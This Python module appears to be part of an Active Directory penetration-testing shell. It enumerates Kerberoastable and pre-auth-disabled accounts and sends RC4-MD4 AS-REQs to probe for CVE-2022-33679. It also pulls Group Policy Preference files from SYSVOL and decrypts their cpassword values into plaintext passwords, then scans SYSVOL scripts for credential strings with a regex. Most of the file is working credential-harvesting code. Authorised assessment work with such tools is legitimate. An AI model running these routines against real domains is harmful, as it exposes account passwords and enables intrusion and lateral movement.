#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Security Assessment Mixin — 安全评估命令 (4 个)
Kerberoast/AS-REP 用户发现 + GPP 密码解密 + SYSVOL 敏感文件/敏感信息扫描。
"""

import base64
import re
import datetime
import xml.etree.ElementTree as ET
from io import BytesIO

try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import unpad
except ImportError:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad

from utils.ui import print_info, print_success, print_found, print_warn, print_error
from utils.helpers import paged_search, parse_args, print_table_capped

# ═══════════════════════════════════════════════════════════════
#  GPP 密码解密常量
#
#  Microsoft 在 [MS-GPPREF] 规范中公开的 AES-256-CBC 密钥，
#  用于解密 Group Policy Preferences 中 cpassword 属性。
#  MS14-025 补丁后新建的 GPO 不再允许存储密码，但旧 GPO
#  中的 cpassword 仍然可以被解密。
# ═══════════════════════════════════════════════════════════════

_GPP_KEY = (
    b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8"
    b"\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
)
_GPP_IV = b"\x00" * 16

# GPP XML 文件相对路径 (相对于 GPO 根目录)
# Machine 和 User 偏好设置都可能包含密码
_GPP_FILES = [
    'Machine\\Preferences\\Groups\\Groups.xml',
    'Machine\\Preferences\\Services\\Services.xml',
    'Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml',
    'Machine\\Preferences\\Drives\\Drives.xml',
    'Machine\\Preferences\\DataSources\\DataSources.xml',
    'Machine\\Preferences\\Printers\\Printers.xml',
    'Machine\\Preferences\\Environment\\Environment.xml',
    'User\\Preferences\\Groups\\Groups.xml',
    'User\\Preferences\\Services\\Services.xml',
    'User\\Preferences\\ScheduledTasks\\ScheduledTasks.xml',
    'User\\Preferences\\Drives\\Drives.xml',
    'User\\Preferences\\DataSources\\DataSources.xml',
    'User\\Preferences\\Printers\\Printers.xml',
    'User\\Preferences\\Environment\\Environment.xml',
]


def _decrypt_gpp_cpassword(cpassword):
    """使用 Microsoft 公开的 AES-256-CBC 密钥解密 GPP cpassword"""
    if not cpassword:
        return None

    # 修正 Base64 padding
    pad = len(cpassword) % 4
    if pad == 1:
        cpassword = cpassword[:-1]
    elif pad in (2, 3):
        cpassword += "=" * (4 - pad)

    try:
        encrypted = base64.b64decode(cpassword)
        cipher = AES.new(_GPP_KEY, AES.MODE_CBC, _GPP_IV)
        decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
        return decrypted.decode('utf-16-le')
    except Exception:
        return None


def _parse_gpp_xml(xml_content, gpo_name):
    """解析 GPP XML，提取所有 cpassword 并解密"""
    results = []
    try:
        root = ET.fromstring(xml_content)
    except ET.ParseError:
        return results

    for elem in root.iter():
        cpassword = elem.get('cpassword')
        if cpassword:
            # 不同 XML 类型用不同属性存储用户名
            user = (
                elem.get('userName')
                or elem.get('newName')
                or elem.get('accountName')
                or elem.get('runAs')
                or 'Unknown'
            )
            changed = elem.getparent().get('changed', '') if elem.getparent() is not None else ''

            password = _decrypt_gpp_cpassword(cpassword)
            if password is not None:
                results.append({
                    'gpo': gpo_name,
                    'user': user,
                    'password': password,
                    'changed': changed,
                })

    return results


# ═══════════════════════════════════════════════════════════════
#  SYSVOL 敏感文件 / 敏感信息扫描
# ═══════════════════════════════════════════════════════════════

# 敏感文件扩展名 (脚本 / 配置 / 凭据容器)
_SENSITIVE_FILE_EXTS = {
    'bat', 'cmd', 'ps1', 'psm1', 'psd1', 'vbs', 'vbe', 'js', 'jse', 'wsf', 'wsh',
    'ini', 'cfg', 'conf', 'config', 'inf', 'xml', 'txt', 'reg',
    'rdp', 'kdbx', 'ppk', 'pem', 'key', 'pfx', 'p12',
    'sql', 'yml', 'yaml', 'properties', 'json', 'csv',
}

# 敏感文件名关键词 (不论扩展名)
_SENSITIVE_FILE_KEYWORDS = [
    'password', 'passwd', 'cred', 'secret', 'unattend', 'sysprep',
    'groups.xml', 'scheduledtasks', 'datasources', 'drives.xml',
    'printers.xml', 'services.xml', 'web.config', 'machine.config',
    'id_rsa', 'id_dsa', 'id_ed25519', 'shadow', 'ntds',
]

# 内容扫描的文本类扩展名
_SCAN_TEXT_EXTS = {
    'bat', 'cmd', 'ps1', 'psm1', 'vbs', 'vbe', 'js', 'jse', 'wsf',
    'ini', 'cfg', 'conf', 'config', 'inf', 'xml', 'txt', 'reg',
    'sql', 'yml', 'yaml', 'properties', 'json', 'csv',
}

# 内容扫描跳过的标准文件 — GPO 安全模板里的密码策略项
# (ClearTextPassword=0 等) 必然命中 password 正则, 是纯噪音
_SCAN_SKIP_FILES = {'gpttmpl.inf', 'gpt.ini'}

# 敏感内容正则 (逐行匹配, 忽略大小写)
_SECRET_RE = re.compile(
    r'cpassword\s*=|'
    r'password\s*[:=]|'
    r'passwd\s*[:=]|'
    r'\bpwd\s*[:=]|'
    r'/user\s*:|'
    r'net(\.exe)?\s+user\s+\S+\s+\S+|'
    r'runas\b|'
    r'psexec\b.*-[up]\s+\S+|'
    r'net\s+use\b.*/user\s*:|'
    r'connectionstring\s*=|'
    r'secret\s*[:=]|'
    r'api[-_]?key\s*[:=]|'
    r'token\s*[:=]|'
    r'-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----',
    re.IGNORECASE,
)

# 内容扫描文件大小上限 (跳过超大文件防拖慢)
_MAX_SCAN_SIZE = 1024 * 1024
# 单个文件最多输出的匹配行数
_MAX_MATCHES_PER_FILE = 20
# SYSVOL 遍历深度上限
_MAX_WALK_DEPTH = 12


def _walk_sysvol(smb, base='', depth=0):
    """递归遍历 SYSVOL 共享, yield (相对路径, SharedFile)"""
    if depth > _MAX_WALK_DEPTH:
        return
    pattern = '%s\\*' % base if base else '\\*'
    try:
        items = smb.listPath('SYSVOL', pattern)
    except Exception:
        return
    for item in items:
        name = item.get_longname()
        if name in ('.', '..'):
            continue
        path = '%s\\%s' % (base, name) if base else name
        if item.is_directory():
            yield from _walk_sysvol(smb, path, depth + 1)
        else:
            yield path, item


def _decode_text(raw):
    """解码文本文件, 自动识别 UTF-16 BOM (很多 Windows 脚本是 UTF-16)"""
    if raw[:2] in (b'\xff\xfe', b'\xfe\xff'):
        return raw.decode('utf-16', errors='ignore')
    return raw.decode('utf-8', errors='ignore')


def _fmt_mtime(item):
    """格式化 SharedFile 的修改时间"""
    try:
        return datetime.datetime.fromtimestamp(item.get_mtime()).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return '-'


# ═══════════════════════════════════════════════════════════════
#  CVE-2022-33679 检测 (Kerberos RC4 downgrade)
#
#  KDC 在 AS-REQ 阶段接受已弃用的 RSADSI RC4-MD4 (etype -128)。
#  对勾选了 "不要求 Kerberos 预认证" 的账户, 只声明 etype=-128 的
#  AS-REQ 若拿到 RC4-MD4 加密的 AS-REP, 说明 KDC 未打 2022-09 补丁/
#  未禁用 RC4 — 可利用 known-plaintext 恢复 keystream 伪造 TGS。
# ═══════════════════════════════════════════════════════════════

_RSADSI_RC4_MD4 = -128


def _check_cve_2022_33679(username, domain, kdc_host):
    """
    CVE-2022-33679 检测: 向 KDC 发送仅声明 etype=-128 的 AS-REQ。
    返回 True(存在漏洞) / False(KDC 拒绝 RC4, 已修复) / None(无法判定)
    """
    import random
    from pyasn1.codec.der import encoder, decoder
    from pyasn1.type.univ import noValue
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime
    from impacket.krb5.asn1 import (
        AS_REQ, AS_REP, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter,
    )
    from impacket.krb5.kerberosv5 import sendReceive, KerberosError

    domain = domain.upper()

    as_req = AS_REQ()
    as_req['pvno'] = 5
    as_req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    req_body = seq_set(as_req, 'req-body')

    opts = [constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.proxiable.value]
    req_body['kdc-options'] = constants.encodeFlags(opts)
    seq_set(req_body, 'sname',
            Principal('krbtgt/%s' % domain,
                      type=constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
    seq_set(req_body, 'cname',
            Principal(username,
                      type=constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
    req_body['realm'] = domain
    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    req_body['till'] = KerberosTime.to_asn1(now)
    try:
        req_body['nonce'] = random.SystemRandom().getrandbits(31)
    except NotImplementedError:
        req_body['nonce'] = random.getrandbits(31)
    # 关键: 只声明 RC4-MD4, 强制 KDC 降级
    seq_set_iter(req_body, 'etype', (_RSADSI_RC4_MD4,))

    pac_req = KERB_PA_PAC_REQUEST()
    pac_req['include-pac'] = True
    as_req['padata'] = noValue
    as_req['padata'][0] = noValue
    as_req['padata'][0]['padata-type'] = int(
        constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    as_req['padata'][0]['padata-value'] = encoder.encode(pac_req)

    try:
        resp = sendReceive(encoder.encode(as_req), domain, kdc_host)
    except KerberosError as e:
        code = e.getErrorCode()
        # KDC 不支持该加密类型 → 已打补丁/禁用 RC4
        if code == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
            return False
        # 仍要求预认证 (账户标志未生效等)
        return None
    except Exception:
        return None

    try:
        as_rep = decoder.decode(resp, asn1Spec=AS_REP())[0]
        return int(as_rep['enc-part']['etype']) == _RSADSI_RC4_MD4
    except Exception:
        return None


class AssessmentMixin:
    """Security Assessment 命令集"""

    def _connect_smb(self):
        """建立到 DC 的 SMB 连接 (密码或 NTHash 认证), 失败返回 None"""
        from impacket.smbconnection import SMBConnection

        if not self.password and not self.nthash:
            print_error("No credentials available for SMB connection")
            return None

        domain = self._extract_domain(self.base_DN)
        try:
            smb = SMBConnection(self.dc_address, self.dc_address)
            if self.nthash:
                smb.login(self.username, '', domain, self.lmhash, self.nthash)
            else:
                smb.login(self.username, self.password, domain)
            return smb
        except Exception as e:
            print_error("SMB connection failed: %s" % str(e))
            return None

    # ── find_kerberoastable ─────────────────────────────────────
    def do_find_kerberoastable(self, line):
        """find_kerberoastable — Kerberoastable 用户 (有 SPN 的启用账户)"""
        print_info("Searching for Kerberoastable users...")
        entries = paged_search(
            self.client, self.domain_dumper.root,
            '(&(objectClass=user)(!(objectClass=computer))(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            attributes=['sAMAccountName', 'servicePrincipalName', 'distinguishedName'],
        )
        if entries:
            print_warn("Found %d Kerberoastable user(s)!" % len(entries))
            for entry in entries:
                sam = entry['sAMAccountName'].value
                spns = entry['servicePrincipalName'].values
                print_found("%s (%s)" % (sam, entry.entry_dn))
                for spn in spns:
                    print_info("  SPN: %s" % spn)
        else:
            print_success("No Kerberoastable users found")

    # ── find_preauth_disabled ─────────────────────────────────
    def do_find_preauth_disabled(self, line):
        """find_preauth_disabled — 不需要 Kerberos 预认证的用户 (AS-REP Roastable), 附 CVE-2022-33679 检测"""
        print_info("Searching for users with pre-auth disabled...")
        # DONT_REQ_PREAUTH = 0x400000
        entries = paged_search(
            self.client, self.domain_dumper.root,
            '(&(objectClass=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
            attributes=['sAMAccountName', 'distinguishedName'],
        )
        if not entries:
            print_success("No users with pre-auth disabled found")
            return

        # 逐账户探测 KDC 是否接受 RC4-MD4 降级 (CVE-2022-33679)
        domain = self._extract_domain(self.base_DN)
        print_info("Found %d user(s), probing KDC %s for RC4 downgrade..."
                   % (len(entries), self.dc_address))

        rows = []
        for entry in entries:
            sam = entry['sAMAccountName'].value
            result = _check_cve_2022_33679(sam, domain, self.dc_address)
            if result is True:
                status = 'VULNERABLE'
            elif result is False:
                status = 'No (RC4 disabled)'
            else:
                status = 'Unknown'
            rows.append([sam, status])

        print()
        print_table_capped(['Username', 'CVE-2022-33679'], rows,
                           tag='find_preauth_disabled')
        print()

        vuln_count = sum(1 for r in rows if r[1] == 'VULNERABLE')
        if vuln_count:
            print_warn("%d/%d account(s) exploitable via CVE-2022-33679 "
                       "(KDC accepts RC4-MD4, etype -128)" % (vuln_count, len(rows)))
        elif all(r[1].startswith('No') for r in rows):
            print_success("KDC rejects RC4 (etype -128) — CVE-2022-33679 not exploitable")
        else:
            print_warn("KDC RC4 status unknown for some account(s)")

    # ── find_gpp_passwords ────────────────────────────────────
    def do_find_gpp_passwords(self, line):
        """find_gpp_passwords — 搜索并解密 SYSVOL 中的 GPP 密码"""
        print_info("Searching for GPP passwords in SYSVOL...")

        smb = self._connect_smb()
        if not smb:
            return

        # 通过 LDAP 枚举所有 GPO，获取 SYSVOL 路径
        entries = paged_search(
            self.client, self.domain_dumper.root,
            '(objectClass=groupPolicyContainer)',
            attributes=['cn', 'displayName', 'gPCFileSysPath'],
        )

        print_info("Checking %d GPO(s) for GPP passwords..." % len(entries))

        found = []
        checked = 0

        for entry in entries:
            gpo_name = entry['displayName'].value or entry['cn'].value
            path = entry['gPCFileSysPath'].value or ''

            # 从 UNC 路径提取 SYSVOL 之后的相对路径
            # \\corp.local\SysVol\corp.local\Policies\{GUID}
            # → corp.local\Policies\{GUID}
            match = re.search(r'[Ss]ys[Vv]ol[\\/](.+)$', path)
            if not match:
                continue
            policy_path = match.group(1).replace('/', '\\')

            # 逐个检查 GPP XML 文件
            for gpp_file in _GPP_FILES:
                full_path = '%s\\%s' % (policy_path, gpp_file)

                try:
                    buf = BytesIO()
                    smb.getFile('SYSVOL', full_path, buf.write)
                    xml_content = buf.getvalue()
                except Exception:
                    continue

                checked += 1
                passwords = _parse_gpp_xml(xml_content, gpo_name)
                found.extend(passwords)

        try:
            smb.close()
        except Exception:
            pass

        # 输出结果
        if found:
            print_warn("Found %d GPP password(s) in %d file(s)!" % (len(found), checked))
            for item in found:
                print_found("GPO: %s" % item['gpo'])
                print_info("  User:     %s" % item['user'])
                print_info("  Password: %s" % item['password'])
                if item['changed']:
                    print_info("  Changed:  %s" % item['changed'])
        else:
            if checked:
                print_success("No GPP passwords found (checked %d preference file(s))" % checked)
            else:
                print_success("No GPP preference files found in SYSVOL")

    # ── find_sysvol_files ─────────────────────────────────────
    def do_find_sysvol_files(self, line):
        """find_sysvol_files [keyword] — 搜索 SYSVOL 中的敏感文件 (脚本/配置/凭据文件)"""
        args = parse_args(line, 0, 1, "find_sysvol_files [password]")
        keyword = args[0].lower() if args else None

        smb = self._connect_smb()
        if not smb:
            return

        if keyword:
            print_info("Walking SYSVOL for files matching '%s'..." % keyword)
        else:
            print_info("Walking SYSVOL for sensitive files...")

        rows = []
        total = 0
        for path, item in _walk_sysvol(smb):
            total += 1
            name = path.split('\\')[-1].lower()
            ext = name.rsplit('.', 1)[-1] if '.' in name else ''
            if keyword:
                hit = keyword in name
            else:
                hit = (ext in _SENSITIVE_FILE_EXTS
                       or any(k in name for k in _SENSITIVE_FILE_KEYWORDS))
            if hit:
                rows.append([path, str(item.get_filesize()), _fmt_mtime(item)])

        try:
            smb.close()
        except Exception:
            pass

        if not rows:
            print_success("No matching files found (walked %d file(s))" % total)
            return

        print_success("Found %d interesting file(s) (walked %d)" % (len(rows), total))
        print_table_capped(['Path', 'Size', 'Modified'], rows,
                           tag='find_sysvol_files')

    # ── find_sysvol_secrets ───────────────────────────────────
    def do_find_sysvol_secrets(self, line):
        """find_sysvol_secrets — 扫描 SYSVOL 脚本/配置中的敏感信息 (密码/凭据/密钥)"""
        smb = self._connect_smb()
        if not smb:
            return

        print_info("Scanning SYSVOL files for sensitive content...")

        rows = []
        scanned = 0
        for path, item in _walk_sysvol(smb):
            name = path.split('\\')[-1].lower()
            ext = name.rsplit('.', 1)[-1] if '.' in name else ''
            if ext not in _SCAN_TEXT_EXTS or name in _SCAN_SKIP_FILES:
                continue
            size = item.get_filesize()
            if size == 0 or size > _MAX_SCAN_SIZE:
                continue

            try:
                buf = BytesIO()
                smb.getFile('SYSVOL', path, buf.write)
                raw = buf.getvalue()
            except Exception:
                continue

            scanned += 1
            hits = 0
            for text_line in _decode_text(raw).splitlines():
                if _SECRET_RE.search(text_line):
                    rows.append([path, text_line.strip()[:120]])
                    hits += 1
                    if hits >= _MAX_MATCHES_PER_FILE:
                        rows.append([path, '... (more matches truncated)'])
                        break

        try:
            smb.close()
        except Exception:
            pass

        if not rows:
            print_success("No sensitive content found (scanned %d file(s))" % scanned)
            return

        print_warn("Found %d sensitive line(s) in %d scanned file(s)!" % (len(rows), scanned))
        print_table_capped(['File', 'Match'], rows, tag='find_sysvol_secrets')
